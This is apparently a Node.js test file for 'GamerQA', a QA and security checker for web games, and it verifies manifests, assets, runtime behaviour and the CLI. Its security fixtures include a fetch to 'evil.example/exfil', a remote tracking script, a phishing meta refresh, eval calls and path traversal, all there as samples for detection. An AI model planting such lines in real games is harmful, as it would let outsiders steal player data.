import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { readStrictJson } from '../core/fs-utils.mjs';
import { GAMERQA_ROOT, resolveProjectRoot } from '../core/paths.mjs';
import { loadReviewPolicy, runQaPipeline, verifyInstallation } from '../core/runner.mjs';
import { renderMarkdownReport } from '../reporters/markdown-reporter.mjs';
import { runStaticSuite } from '../suites/static/index.mjs';
import { runSecuritySuite } from '../suites/security/index.mjs';
import {
  resolveBrowserExecutable,
  resolvePlaywrightModule,
  runRuntimeWebSuite,
} from '../suites/runtime-web/index.mjs';

const VALID_PNG_1X1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
  'base64'
);

const HAS_BROWSER = Boolean(resolvePlaywrightModule() || resolveBrowserExecutable());

function createFixtureRoot(t, gamesSpec = []) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gamerqa-test-'));
  t.after(() => fs.rmSync(tmpDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 150 }));

  fs.mkdirSync(path.join(tmpDir, 'games'), { recursive: true });
  const entries = [];

  for (const spec of gamesSpec) {
    const id = spec.id;
    entries.push({
      id,
      path: spec.catalogPath ?? id,
      enabled: spec.enabled ?? true,
      priority: 10,
      kind: 'imported',
      displayName: spec.displayName ?? id,
    });

    const gameDir = path.join(tmpDir, 'games', id);
    const webDir = path.join(gameDir, 'Web');
    fs.mkdirSync(path.join(webDir, 'assets'), { recursive: true });

    if (spec.manifest !== null) {
      const manifest = spec.manifest ?? {
        schemaVersion: 1,
        id,
        slug: id,
        title: { ko: `테스트 게임 ${id}`, en: `Test Game ${id}` },
        summary: {
          ko: '자동화 QA 테스트용 정상 샘플 웹 게임입니다.',
          en: 'Valid sample web game fixture for automated QA verification.',
        },
        instructions: {
          ko: '마우스 또는 키보드로 화면을 조작해 점수를 획득하는 테스트 게임입니다.',
          en: 'Interact with the canvas using mouse or keyboard to verify runtime execution.',
        },
        rules: {
          ko: '게임 규칙과 목표가 정상 작동하는지 확인하기 위한 샘플 규칙입니다.',
          en: 'Sample rule text meeting minimum character validation requirements.',
        },
        entry: 'index.html',
        version: '1.0.0',
        updatedOn: '2026-11-20',
        tags: ['puzzle'],
        controls: ['keyboard', 'mouse'],
        viewport: { width: 1280, height: 800, orientation: 'landscape', resize: 'responsive' },
        capabilities: {
          webgl: false,
          wasm: false,
          workers: false,
          fullscreen: true,
          pointerLock: false,
          externalNetwork: [],
        },
        save: { enabled: false, schemaVersion: 1, maxSlots: 0 },
        media: { cover: 'assets/cover.png', screenshots: ['assets/cover.png'] },
        integration: 'legacy-localstorage',
        supportedLocales: ['ko', 'en'],
        ...(spec.manifestOverrides || {}),
      };
      fs.writeFileSync(path.join(gameDir, 'game.manifest.json'), JSON.stringify(manifest, null, 2));
    }

    if (spec.writeCover !== false) {
      fs.writeFileSync(path.join(webDir, 'assets', 'cover.png'), VALID_PNG_1X1);
    }

    if (spec.html !== null) {
      const html =
        spec.html ??
        `<!doctype html><html lang="ko"><head><meta charset="utf-8"><title>${id}</title></head><body><h1>${id}</h1><canvas id="c" width="320" height="200"></canvas><script src="app.js"></script></body></html>`;
      fs.writeFileSync(path.join(webDir, spec.entryName || 'index.html'), html);
    }

    if (spec.appJs !== null) {
      const appJs =
        spec.appJs ??
        `const ctx = document.getElementById('c').getContext('2d'); ctx.fillStyle = '#48a'; ctx.fillRect(0,0,320,200);`;
      fs.writeFileSync(path.join(webDir, 'app.js'), appJs);
    }

    for (const [rel, content] of Object.entries(spec.extraFiles || {})) {
      const target = path.join(webDir, rel);
      fs.mkdirSync(path.dirname(target), { recursive: true });
      fs.writeFileSync(target, content);
    }
  }

  if (!gamesSpec.some((s) => s.omitCatalog)) {
    fs.writeFileSync(
      path.join(tmpDir, 'games', 'catalog.json'),
      JSON.stringify({ schemaVersion: 1, entries }, null, 2)
    );
  }

  return tmpDir;
}

test('verifyInstallation and project root auto-resolution succeed without hardcoded absolute paths', () => {
  const resolved = resolveProjectRoot();
  assert.ok(fs.existsSync(path.join(resolved, 'games', 'catalog.json')));
  const verify = verifyInstallation();
  assert.equal(verify.ok, true);
  assert.ok(verify.checks.some((c) => c.id === 'VERIFY-SCHEMA' && c.ok));
  assert.ok(verify.checks.some((c) => c.id === 'VERIFY-POLICY' && c.ok));

  // Verify no hardcoded worktree drive paths in GamerQA source files
  for (const rel of ['bin/gamerqa.mjs', 'core/runner.mjs', 'core/paths.mjs', 'suites/static/index.mjs', 'suites/security/index.mjs', 'suites/runtime-web/index.mjs']) {
    const content = fs.readFileSync(path.join(GAMERQA_ROOT, rel), 'utf8');
    assert.equal(/[A-Za-z]:\\\\?Github/i.test(content), false, `Found hardcoded repo path in ${rel}`);
  }
});

test('schema and policy contracts satisfy GamerQA v1 invariants', () => {
  const schema = readStrictJson(path.join(GAMERQA_ROOT, 'schemas', 'qa-run.schema.json'));
  const { policy } = loadReviewPolicy('v1');
  assert.equal(schema.properties.schemaVersion.const, 1);
  assert.equal(policy.version, 'v1');
  assert.ok(policy.rules.length >= 15);
  for (const rule of policy.rules) {
    assert.ok(['static', 'security', 'runtime-web'].includes(rule.suite));
    assert.ok(['block', 'major', 'minor', 'info'].includes(rule.severity));
  }
});

test('static suite validates clean game and catches manifest errors, traversal, missing assets, and forbidden patterns', async (t) => {
  const { policy } = loadReviewPolicy('v1');
  const root = createFixtureRoot(t, [
    { id: 'valid-game' },
    {
      id: 'bad-manifest',
      manifestOverrides: { slug: 'wrong-slug', version: 'bad', updatedOn: '2026-11-31' },
    },
    {
      id: 'traversal-game',
      html: '<!doctype html><html><head><base href="/"></head><body><script src="../outside.js"></script><script src="missing.js"></script></body></html>',
      appJs: null,
    },
    {
      id: 'meta-refresh-local',
      html: '<!doctype html><html><head><meta http-equiv="refresh" content="0; url=play.html"></head><body><a href="play.html">Play</a></body></html>',
      extraFiles: {
        'play.html': '<!doctype html><html><head><meta charset="utf-8"><title>Play</title></head><body><canvas id="c" width="200" height="200"></canvas><script src="app.js"></script></body></html>',
      },
    },
    {
      id: 'meta-refresh-external',
      html: '<!doctype html><html><head><meta http-equiv="refresh" content="0; url=https://evil.example/phish"></head><body></body></html>',
    },
  ]);

  const okStatic = await runStaticSuite({ projectRoot: root, gameId: 'valid-game', policy });
  assert.equal(okStatic.checks.every((c) => c.status === 'pass'), true);

  const badManifest = await runStaticSuite({ projectRoot: root, gameId: 'bad-manifest', policy });
  assert.equal(badManifest.checks.find((c) => c.ruleId === 'STATIC-MANIFEST-SCHEMA')?.status, 'fail');

  const traversal = await runStaticSuite({ projectRoot: root, gameId: 'traversal-game', policy });
  assert.equal(traversal.checks.find((c) => c.ruleId === 'STATIC-ASSET-REFS')?.status, 'fail');
  assert.equal(traversal.checks.find((c) => c.ruleId === 'STATIC-FORBIDDEN-PATTERN')?.status, 'fail');

  const localRefresh = await runStaticSuite({ projectRoot: root, gameId: 'meta-refresh-local', policy });
  assert.equal(localRefresh.checks.find((c) => c.ruleId === 'STATIC-FORBIDDEN-PATTERN')?.status, 'warn');

  const extRefresh = await runStaticSuite({ projectRoot: root, gameId: 'meta-refresh-external', policy });
  assert.equal(extRefresh.checks.find((c) => c.ruleId === 'STATIC-FORBIDDEN-PATTERN')?.status, 'fail');
});

test('security suite blocks unallowlisted external requests and dangerous APIs while allowing Godot glue & provenance metadata', async (t) => {
  const { policy } = loadReviewPolicy('v1');
  const root = createFixtureRoot(t, [
    {
      id: 'evil-net',
      html: '<!doctype html><html><head><script src="https://evil.example/track.js"></script></head><body><script src="app.js"></script></body></html>',
      appJs: `fetch('https://evil.example/exfil'); eval('1+1');`,
    },
    {
      id: 'indirect-eval',
      appJs: `const run = eval; run('1+1');`,
    },
    {
      id: 'allowed-net',
      manifestOverrides: {
        capabilities: { webgl: false, wasm: false, workers: false, fullscreen: true, pointerLock: false, externalNetwork: ['https://api.example.com'] },
      },
      html: '<!doctype html><html><head></head><body><script src="app.js"></script></body></html>',
      appJs: `fetch('https://api.example.com/score');`,
    },
    {
      id: 'provenance-only',
      appJs: `const meta = { source: "https://github.com/example/game" }; console.log(meta.source);`,
    },
    {
      id: 'godot-glue',
      manifestOverrides: {
        capabilities: { webgl: true, wasm: true, workers: true, fullscreen: true, pointerLock: false, externalNetwork: [] },
      },
      html: '<!doctype html><html><head></head><body><canvas id="canvas"></canvas><script src="index.js"></script></body></html>',
      appJs: null,
      extraFiles: {
        'GODOT_LICENSE.txt': 'Godot Engine License',
        'index.wasm': Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]),
        'index.js': 'var GodotRuntime={}; function _godot_js_eval(js_code){ const global_eval=eval; return global_eval(js_code); }',
      },
    },
  ]);

  const sEvil = await runStaticSuite({ projectRoot: root, gameId: 'evil-net', policy });
  const secEvil = await runSecuritySuite({ gameId: 'evil-net', policy, staticContext: sEvil.context });
  assert.equal(secEvil.checks.find((c) => c.ruleId === 'SEC-EXTERNAL-URL-ACTIVE')?.status, 'fail');
  assert.equal(secEvil.checks.find((c) => c.ruleId === 'SEC-DANGEROUS-API')?.status, 'fail');

  const sIndirect = await runStaticSuite({ projectRoot: root, gameId: 'indirect-eval', policy });
  const secIndirect = await runSecuritySuite({ gameId: 'indirect-eval', policy, staticContext: sIndirect.context });
  assert.equal(secIndirect.checks.find((c) => c.ruleId === 'SEC-DANGEROUS-API')?.status, 'fail');

  const sAllowed = await runStaticSuite({ projectRoot: root, gameId: 'allowed-net', policy });
  const secAllowed = await runSecuritySuite({ gameId: 'allowed-net', policy, staticContext: sAllowed.context });
  assert.equal(secAllowed.checks.find((c) => c.ruleId === 'SEC-EXTERNAL-URL-ACTIVE')?.status, 'pass');

  const sProv = await runStaticSuite({ projectRoot: root, gameId: 'provenance-only', policy });
  const secProv = await runSecuritySuite({ gameId: 'provenance-only', policy, staticContext: sProv.context });
  assert.equal(secProv.checks.find((c) => c.ruleId === 'SEC-EXTERNAL-URL-ACTIVE')?.status, 'pass');
  assert.equal(secProv.checks.find((c) => c.ruleId === 'SEC-EXTERNAL-URL-PASSIVE')?.status, 'pass');

  const sGodot = await runStaticSuite({ projectRoot: root, gameId: 'godot-glue', policy });
  const secGodot = await runSecuritySuite({ gameId: 'godot-glue', policy, staticContext: sGodot.context });
  assert.equal(secGodot.checks.find((c) => c.ruleId === 'SEC-DANGEROUS-API')?.status, 'warn');
});

test('runtime-web suite verifies HTTP 200 assets, marks skip as non-passing partial, and catches runtime browser failures', async (t) => {
  const { policy } = loadReviewPolicy('v1');
  const root = createFixtureRoot(t, [
    { id: 'healthy-web' },
    {
      id: 'missing-asset-http',
      html: '<!doctype html><html><head><title>Broken</title></head><body><script src="does-not-exist.js"></script></body></html>',
      appJs: null,
    },
    {
      id: 'console-error-game',
      appJs: `console.error('boom during boot'); throw new Error('uncaught boom');`,
    },
  ]);

  // 1. Skip browser produces partial & passed=false
  const skippedOut = path.join(root, 'artifacts', 'skip-run');
  const skipPipeline = await runQaPipeline({
    projectRoot: root,
    games: ['healthy-web'],
    outDir: skippedOut,
    runId: 'skip-test',
    skipBrowser: true,
  });
  assert.equal(skipPipeline.report.status, 'partial');
  assert.equal(skipPipeline.report.passed, false);
  assert.equal(skipPipeline.report.games[0].checks.find((c) => c.ruleId === 'RT-HTTP-BOOT')?.status, 'pass');
  assert.equal(skipPipeline.report.games[0].checks.find((c) => c.ruleId === 'RT-BROWSER-LOAD')?.status, 'skip');

  // 2. HTTP missing asset detected when continueOnBlock=true
  const sBroken = await runStaticSuite({ projectRoot: root, gameId: 'missing-asset-http', policy });
  const rtBroken = await runRuntimeWebSuite({
    projectRoot: root,
    gameId: 'missing-asset-http',
    policy,
    staticContext: sBroken.context,
    skipBrowser: true,
  });
  assert.equal(rtBroken.checks.find((c) => c.ruleId === 'RT-HTTP-ASSETS')?.status, 'fail');

  // 3. Real headless browser verification (runs when Chrome/Playwright is available)
  if (HAS_BROWSER) {
    const outDir = path.join(root, 'artifacts', 'browser-run');
    const healthyRun = await runQaPipeline({
      projectRoot: root,
      games: ['healthy-web'],
      outDir,
      runId: 'healthy-browser',
    });
    assert.equal(healthyRun.report.status, 'passed');
    assert.equal(healthyRun.report.passed, true);
    assert.equal(healthyRun.report.games[0].screenshots.length, 1);
    assert.ok(fs.existsSync(path.join(outDir, healthyRun.report.games[0].screenshots[0].relativePath)));

    const errorRun = await runQaPipeline({
      projectRoot: root,
      games: ['console-error-game'],
      outDir: path.join(root, 'artifacts', 'error-run'),
      runId: 'error-browser',
    });
    assert.equal(errorRun.report.status, 'failed');
    assert.equal(errorRun.report.passed, false);
    assert.equal(errorRun.report.games[0].checks.find((c) => c.ruleId === 'RT-BROWSER-CONSOLE')?.status, 'fail');
  }
});

test('CLI run, report, verify, and Run_GamerQA.bat --check work end-to-end', async (t) => {
  const root = createFixtureRoot(t, [
    { id: 'cli-ok' },
    { id: 'cli-fail', manifestOverrides: { slug: 'mismatch' } },
  ]);
  const cliPath = path.join(GAMERQA_ROOT, 'bin', 'gamerqa.mjs');
  const outDir = path.join(root, 'artifacts', 'cli-run');

  // Run CLI in HTTP-only mode for fast deterministic CLI verification
  const runProc = spawnSync(
    process.execPath,
    [cliPath, 'run', '--project-root', root, '--game', 'cli-ok', '--tier', 'static,security', '--out-dir', outDir, '--run-id', 'cli-e2e', '--json'],
    { encoding: 'utf8' }
  );
  assert.equal(runProc.status, 0, runProc.stderr);
  const parsed = JSON.parse(runProc.stdout);
  assert.equal(parsed.status, 'passed');
  assert.equal(parsed.passed, true);
  assert.ok(fs.existsSync(path.join(outDir, 'report.json')));
  assert.ok(fs.existsSync(path.join(outDir, 'REPORT.md')));
  assert.ok(fs.existsSync(path.join(outDir, 'evidence-manifest.json')));

  // Fail-fast skips Tier 1 when Tier 0 hits a block rule
  const failRun = await runQaPipeline({
    projectRoot: root,
    games: ['cli-fail'],
    outDir: path.join(root, 'artifacts', 'cli-fail'),
    runId: 'cli-fail',
  });
  assert.equal(failRun.report.status, 'failed');
  assert.equal(failRun.report.games[0].checks.find((c) => c.ruleId === 'RT-HTTP-BOOT')?.status, 'skip');

  // Report subcommand regenerates markdown report
  const customMd = path.join(outDir, 'CUSTOM.md');
  const repProc = spawnSync(
    process.execPath,
    [cliPath, 'report', '--input', path.join(outDir, 'report.json'), '--out', customMd],
    { encoding: 'utf8' }
  );
  assert.equal(repProc.status, 0, repProc.stderr);
  const mdText = fs.readFileSync(customMd, 'utf8');
  assert.match(mdText, /cli-ok/);
  assert.match(mdText, /STATIC-MANIFEST-SCHEMA/);
  assert.equal(renderMarkdownReport(readStrictJson(path.join(outDir, 'report.json'))), mdText);

  // Verify subcommand and Run_GamerQA.bat --check against current worktree
  const verifyProc = spawnSync(process.execPath, [cliPath, 'verify', '--check'], { encoding: 'utf8' });
  assert.equal(verifyProc.status, 0, verifyProc.stderr);

  if (process.platform === 'win32') {
    const batProc = spawnSync(
      'cmd.exe',
      ['/c', path.join(GAMERQA_ROOT, 'Run_GamerQA.bat'), '--check'],
      {
        encoding: 'utf8',
        env: { ...process.env, GAMERQA_NODE_BIN: process.execPath, PLAYHUB_NO_PAUSE: '1' },
      }
    );
    assert.equal(batProc.status, 0, batProc.stderr + batProc.stdout);
  }
});
